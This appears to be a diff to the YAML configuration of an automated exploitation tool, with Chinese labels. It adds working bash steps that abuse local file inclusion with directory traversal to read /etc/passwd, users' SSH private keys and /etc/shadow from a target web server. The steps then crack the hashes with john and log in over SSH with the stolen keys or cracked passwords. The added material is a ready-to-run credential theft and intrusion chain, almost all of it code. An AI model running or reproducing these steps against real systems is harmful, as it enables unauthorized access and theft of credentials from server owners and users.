@@ -360,9 +360,176 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_apache_log_poison"
 
+  - path_id: lfi_cred_reuse
+    name: "LFI 偷取凭据复用 (SSH 密钥登录 / shadow 破解)"
+    priority: 3
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: ssh_key_login
+        description: "用 LFI 偷取的 SSH 私钥尝试登录目标"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== LFI Credential Reuse: SSH Key Login ==="
+
+          LFI_PARAM="{lfi_param}"
+          LFI_DEPTH="{lfi_depth}"
+          LFI_PATH="{lfi_path}"
+          [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
+          [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ -z "$LFI_PARAM" ] && [ -z "$LFI_PATH" ] && LFI_PARAM="page"
+
+          build_url() {
+            local target_file="$1"
+            local TRAV
+            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+            if [ -n "$LFI_PATH" ]; then
+              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            else
+              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+            fi
+          }
+
+          # 1) Read /etc/passwd to get user list
+          passwd_url=$(build_url "etc/passwd")
+          PASSWD=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
+          USERS=$(echo "$PASSWD" | grep -E ':/home/|:/root:' | cut -d: -f1 | head -10)
+          [ -z "$USERS" ] && USERS="root"
+          echo "目标用户: $USERS"
+
+          # 2) Try to fetch SSH keys for each user and login
+          for user in $USERS; do
+            if [ "$user" = "root" ]; then
+              KEY_PATH="root/.ssh/id_rsa"
+            else
+              KEY_PATH="home/$user/.ssh/id_rsa"
+            fi
+            key_url=$(build_url "$KEY_PATH")
+            echo "[FETCH] $key_url"
+            KEY_CONTENT=$(curl -s "$key_url" --max-time 8 2>/dev/null)
+            if echo "$KEY_CONTENT" | grep -q "BEGIN.*PRIVATE KEY"; then
+              echo "[HIT] 找到 $user 的 SSH 私钥"
+              KEYFILE=$(mktemp /tmp/stolen_key_XXXX)
+              echo "$KEY_CONTENT" > "$KEYFILE"
+              chmod 600 "$KEYFILE"
+              # Try SSH login
+              result=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
+                       -o BatchMode=yes -i "$KEYFILE" \
+                       "$user@{TARGET_IP}" "id" 2>&1)
+              if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                echo "[HIT] SSH_KEY_LOGIN_RCE:$user"
+                echo "$result"
+                rm -f "$KEYFILE"
+                exit 0
+              else
+                echo "[FAIL] SSH key login as $user failed: $result"
+              fi
+              rm -f "$KEYFILE"
+            fi
+          done
+          echo "SSH_KEY_LOGIN_FAILED"
+        timeout: 90
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: shadow_crack
+        evidence_capture:
+          shell_type: "rce"
+          current_user: stdout
+
+      - id: shadow_crack
+        description: "LFI 读取 /etc/shadow + john 破解 + SSH/su 登录"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== LFI Credential Reuse: Shadow Crack ==="
+
+          LFI_PARAM="{lfi_param}"
+          LFI_DEPTH="{lfi_depth}"
+          LFI_PATH="{lfi_path}"
+          [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
+          [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ -z "$LFI_PARAM" ] && [ -z "$LFI_PATH" ] && LFI_PARAM="page"
+
+          build_url() {
+            local target_file="$1"
+            local TRAV
+            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+            if [ -n "$LFI_PATH" ]; then
+              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            else
+              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+            fi
+          }
+
+          # Fetch /etc/shadow
+          shadow_url=$(build_url "etc/shadow")
+          echo "[FETCH] $shadow_url"
+          SHADOW=$(curl -s "$shadow_url" --max-time 8 2>/dev/null)
+          if ! echo "$SHADOW" | grep -qE '^[a-z_][\w.-]*:\$'; then
+            echo "SHADOW_NOT_READABLE"
+            exit 1
+          fi
+          echo "[HIT] /etc/shadow 可读"
+
+          # Also fetch /etc/passwd for john
+          passwd_url=$(build_url "etc/passwd")
+          PASSWD_CONTENT=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
+
+          SHADOW_FILE=$(mktemp /tmp/shadow_XXXX)
+          PASSWD_FILE=$(mktemp /tmp/passwd_XXXX)
+          echo "$SHADOW" > "$SHADOW_FILE"
+          echo "$PASSWD_CONTENT" > "$PASSWD_FILE"
+
+          # unshadow + john (quick mode, 60s timeout)
+          UNSHADOW_FILE=$(mktemp /tmp/unshadow_XXXX)
+          unshadow "$PASSWD_FILE" "$SHADOW_FILE" > "$UNSHADOW_FILE" 2>/dev/null || \
+            cp "$SHADOW_FILE" "$UNSHADOW_FILE"
+
+          echo "[CRACK] john --wordlist=/usr/share/wordlists/rockyou-top100.txt ..."
+          timeout 60 john --wordlist=/usr/share/wordlists/rockyou-top100.txt \
+            "$UNSHADOW_FILE" 2>/dev/null || true
+          john --show "$UNSHADOW_FILE" 2>/dev/null | head -20
+
+          # Extract cracked credentials
+          CRACKED=$(john --show "$UNSHADOW_FILE" 2>/dev/null | grep ':' | head -5)
+          if [ -z "$CRACKED" ]; then
+            echo "SHADOW_CRACK_FAILED: no passwords cracked"
+            rm -f "$SHADOW_FILE" "$PASSWD_FILE" "$UNSHADOW_FILE"
+            exit 1
+          fi
+
+          echo "[HIT] 破解到凭据:"
+          echo "$CRACKED"
+
+          # Try SSH login with cracked creds
+          echo "$CRACKED" | while IFS=: read -r user pass rest; do
+            [ -z "$user" ] || [ -z "$pass" ] && continue
+            echo "[SSH] 尝试 $user:$pass ..."
+            result=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
+                     -o ConnectTimeout=5 "$user@{TARGET_IP}" "id" 2>&1)
+            if echo "$result" | grep -qE 'uid=[0-9]+'; then
+              echo "[HIT] SHADOW_CRACK_RCE:$user"
+              echo "$result"
+              rm -f "$SHADOW_FILE" "$PASSWD_FILE" "$UNSHADOW_FILE"
+              exit 0
+            fi
+          done
+          echo "SHADOW_CRACK_LOGIN_FAILED"
+          rm -f "$SHADOW_FILE" "$PASSWD_FILE" "$UNSHADOW_FILE"
+        timeout: 120
+        success_criteria:
+          stdout_regex: "uid=[0-9]+"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce"
+          current_user: stdout
+
   - path_id: lfi_sensitive_read
     name: "LFI 敏感文件深度读取（验证 + 批量敏感文件探测）"
-    priority: 3
+    priority: 4
     conditions:
       lfi_confirmed: true
     steps:
@@ -533,14 +700,14 @@ exploit_paths:
         timeout: 120
         success_criteria:
           stdout_not_empty: true
-        on_success: conclude_success
-        on_fail: conclude_success
+        on_success: next_path
+        on_fail: next_path
         evidence_capture:
           shell_type: "file_read"
 
   - path_id: php_filter_chain
     name: "PHP Filter 链源码读取"
-    priority: 4
+    priority: 5
     conditions:
       lfi_confirmed: true
     steps:
@@ -570,7 +737,7 @@ exploit_paths:
         timeout: 30
         success_criteria:
           stdout_contains_any: ["PHP_FILTER_OK", "<?php"]
-        on_success: conclude_success
+        on_success: next_path
         on_fail: next_path
         evidence_capture:
           shell_type: "source_read"
